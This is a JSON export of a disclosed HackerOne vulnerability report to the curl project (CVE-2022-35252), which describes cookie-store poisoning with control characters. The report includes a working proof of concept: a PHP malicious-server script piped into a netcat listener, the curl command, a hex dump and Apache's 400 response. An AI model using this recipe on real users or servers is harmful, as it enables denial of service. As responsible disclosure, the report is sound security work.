{
  "id": 1613943,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjEzOTQz",
  "url": "https://hackerone.com/reports/1613943",
  "title": "CVE-2022-35252: control code in cookie denial of service",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2022-06-26T08:46:53.961Z",
  "submitted_at": "2022-06-26T08:46:53.990Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "haxatron1",
    "url": "/haxatron1",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f36x3eaxfnfo7885y97xarsr2csu/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2022-35252"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-08-31T10:55:57.488Z",
  "bug_reporter_agreed_on_going_public_at": "2022-08-31T10:55:57.399Z",
  "team_member_agreed_on_going_public_at": "2022-08-31T06:54:47.786Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nI took a look at https://github.com/curl/curl/pull/9048/commits/d7bcbc7d8d4b6d972d3da12d54819169a19c287b (a sneak peek on a vulnerability to be announced tomorrow). My guess for that vulnerability is that since cookies are persistent, someone who can trick curl into storing cookies can store large amounts of cookies into curl cookie store, which will prevent curl from ever interacting with the server (due to large request being generated causing a 400 error)\n\nI found a separate way to do this, curl does not implement character check on cookie name or value when saving to cookie store. So for example a form feed '\\f' can be saved in curl's cookie store. When form feed is sent by curl to a server such as Apache, Apache will respond with 400 Error (historically, Apache would accept, however now due to HTTP smuggling concerns, Apache will now strictly reject any such control characters.), preventing someone from ever interacting the server with the cookie store.\n\nAccording to the spec, cookies should not contain control characters anyway, see https://datatracker.ietf.org/doc/html/rfc6265#section-4.1.1.\n\n## Steps To Reproduce:\n\n1. \n\nIn test.php,\n`````\n<?php\necho(\"HTTP/1.1 200 OK\\r\\nDate: Fri, 29 Apr 2022 10:11:55 GMT\\r\\nServer: Apache/2.4.43 (Debian)\\r\\nSet-Cookie: a=b\\f; \\r\\nContent-Length: 0\\r\\nConnection: close\\r\\nContent-Type: text/html; charset=UTF-8\\r\\n\\r\\n\");\n`````\nSetup malicious server,\n`````\nphp test.php | nc -nvlp 3333\n`````\n\n2. Cookie with form feed is saved, see 0c byte before the 0a terminator\n`````\ncurl -c cookies.txt http://127.0.0.1:3333\n`````\n`````\nâžœ  ~ xxd cookies.txt\n00000000: 2320 4e65 7473 6361 7065 2048 5454 5020  # Netscape HTTP \n00000010: 436f 6f6b 6965 2046 696c 650a 2320 6874  Cookie File.# ht\n00000020: 7470 733a 2f2f 6375 726c 2e73 652f 646f  tps://curl.se/do\n00000030: 6373 2f68 7474 702d 636f 6f6b 6965 732e  cs/http-cookies.\n00000040: 6874 6d6c 0a23 2054 6869 7320 6669 6c65  html.# This file\n00000050: 2077 6173 2067 656e 6572 6174 6564 2062   was generated b\n00000060: 7920 6c69 6263 7572 6c21 2045 6469 7420  y libcurl! Edit \n00000070: 6174 2079 6f75 7220 6f77 6e20 7269 736b  at your own risk\n00000080: 2e0a 0a31 3237 2e30 2e30 2e31 0946 414c  ...127.0.0.1.FAL\n00000090: 5345 092f 0946 414c 5345 0930 0961 0962  SE./.FALSE.0.a.b\n000000a0: 0c0a                                     ..\n`````\n3. Apache will now respond with \"400 bad request\" on further request to the server using the poisoned cookie store. This because Apache rejects control characters other than \\r or \\n in the request head.\n`````\n* Trying 127.0.0.1:80...\n* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)\n> GET / HTTP/1.1\n> Host: 127.0.0.1\n> User-Agent: curl/7.83.1\n> Accept: */*\n> Cookie: a=b\n\n> \n* Mark bundle as not supporting multiuse\n< HTTP/1.1 400 Bad Request\n< Date: Tue, 21 Jun 2022 04:09:08 GMT\n< Server: Apache/2.4.43 (Debian)\n< Content-Length: 301\n< Connection: close\n< Content-Type: text/html; charset=iso-8859-1\n< \n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>400 Bad Request</title>\n</head><body>\n<h1>Bad Request</h1>\n<p>Your browser sent a request that this server could not understand.<br />\n</p>\n<hr>\n<address>Apache/2.4.43 (Debian) Server at 127.0.1.1 Port 80</address>\n</body></html>\n`````\n\n## Impact\n\nAn attacker can possibly MiTM the connection and poison the cookie store using cookies with control characters, preventing a user / application from ever interacting with the particular HTTP server with the same cookie store.\n\nPossibly same impact as the \"cookie limit\" vulnerability to be announced tomorrow.",
  "weakness": {
    "id": 107,
    "name": "Improper Input Validation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-09-30T06:54:48.069Z",
  "allow_singular_disclosure_after": -43313558.946699515,
  "singular_disclosure_allowed": true,
  "vote_count": 13,
  "voters": [
    "zqyzoid",
    "zy9ard3",
    "tess",
    "sa1tama0",
    "shivammusic",
    "sey194",
    "austinst33l",
    "rajeshsagar",
    "sheryx00",
    "expon",
    "and 3 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
